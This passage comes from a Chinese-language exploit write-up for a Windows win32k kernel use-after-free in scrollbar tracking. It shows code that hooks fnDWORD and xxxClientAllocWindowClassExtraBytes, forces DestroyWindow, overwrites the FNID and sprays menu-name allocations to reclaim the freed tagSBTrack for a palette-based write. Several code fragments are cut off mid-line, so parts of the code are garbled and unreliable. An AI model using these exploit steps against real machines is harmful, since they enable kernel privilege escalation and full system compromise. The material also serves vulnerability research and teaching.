    [+] 为什么要设置wndclass.cbWndExtra = 0x08？
    [+] 为什么要滚动条必须设置为WS_CHILD？
这些问题都会在接下来的触发过程分析中得到解答。
## 触发过程分析
    {
        //Hook
        Hook_Init();
        Flag = 1;
        //debug
        DebugBreak();
        //向滚动条发送点击消息
        SendMessageA(SrollBar, WM_LBUTTONDOWN, MK_LBUTTON, 0x00080008);
    }
在执行完Hook_Init函数之后，我们的准备工作已经基本完成了。首先向滚动条发送WM_LBUTTONDOWN消息，滚动条会调用xxxSBTrack函数来实现滚动条的鼠标跟随并且用SBTrack来保存鼠标位置，之后会调用xxxSBTrackLoop循环获取鼠标消息。xxxSBTrackLoop循环会调用fnDWORD回调函数来回到R3，如果我们hook
fnDWORD的话，就可以在xxxSBRrackInit函数执行期间进行一些额外的操作，这就是为什么hook fnDWORD的原因。额外操作具体如下
    VOID fnDWORDHook(PMSG MSG) {
        if (Flag) {
            Flag = 0;
            DestroyWindow(Window);
        }
        if (*((PULONG64)MSG + 1) == 0x70) {
            cout KernelCallbackTable)[126]所在的地址，该处正好就是我们hook的
`xxxClientAllocWindowClassExtraBytes`。所以我们前面特地设置`wndclass.cbWndExtra =
0x08`和hook了`xxxClientAllocWindowClassExtraBytes`都是为了进入这个函数，然后调用我们的hook函数。
    VOID xxxClientAllocWindowClassExtraBytesHook(PVOID MSG) {
        if ((*(HWND*)*(HWND*)MSG) == Window) {
            cout spwndSBNotify);
        Unlock(&pSBTrack->spwndSB);
        Unlock(&pSBTrack->spwndTrack);
        UserFreePool(pSBTrack);
        PWNDTOPSBTRACK(pwnd) = NULL;
    }
在xxxSBLoop结束后，会对spwndSBNotify和主窗口的引用进行解引用。虽然父窗口已经被释放了，但子窗口还对父窗口有引用，所以相关的pool并没有被释放，但由于这是最后一个引用，HMAssignmentUnlock函数清除赋值锁的过程会减小对象的锁计数，在锁计数减小为0时调用HMUnlockObjectInternal销毁对象，销毁时调用win32k!ghati对应表项的销毁例程，并最终调用win32kfull!xxxDestroyWindow对窗口对象进行释放，这就是我们需要定义滚动条子控件的原因。
兜兜转转我们又回到了win32kfull!xxxDestroyWindow函数，刚刚已经分析过了，xxxDestroyWindow调用xxxFreeWindow来释放窗口，而FNID为释放窗口的Flag属性，我们把FNID修改为了0x2A1，正好可以通过下图的验证
过了验证之后我们会再一次调用fnDWORDHook函数并发送0x70的Message，回顾一下我们的fnDWORDHook
    VOID fnDWORDHook(PMSG MSG) {
        if (Flag) {
            Flag = 0;
            DestroyWindow(Window);
        }
        if (*((PULONG64)MSG + 1) == 0x70) {
            cout spwndSBNotify);
        Unlock(&pSBTrack->spwndSB);         // 对主窗口解引用
        Unlock(&pSBTrack->spwndTrack);      // tagSBTrack解引用
        UserFreePool(pSBTrack);
        PWNDTOPSBTRACK(pwnd) = NULL;
    }
注意`Unlock(&pSBTrack->spwndTrack);`，在解引用tagSBTrack之前，tagSBTrack结构已经被释放了，如果我们堆喷射很多个0x80大小的session来重引用tagSBTrack。
    UCHAR MenuNames[0x100] = { 0 }, ClassName[0x50] = { 0 };
        memset(MenuNames, 0x43, 0x80 - 0x20);
        *(ULONG64*)((ULONG64)MenuNames + 0x10) = To_Where_A_Palette;
        *(ULONG64*)((ULONG64)MenuNames + 0x08) = To_Where_A_Palette;
        while (I palVersion = 0x0300;
        Palette->palNumEntries = 0x1D5;
        A_Palette_Address = GetMenuAddress();
        cout 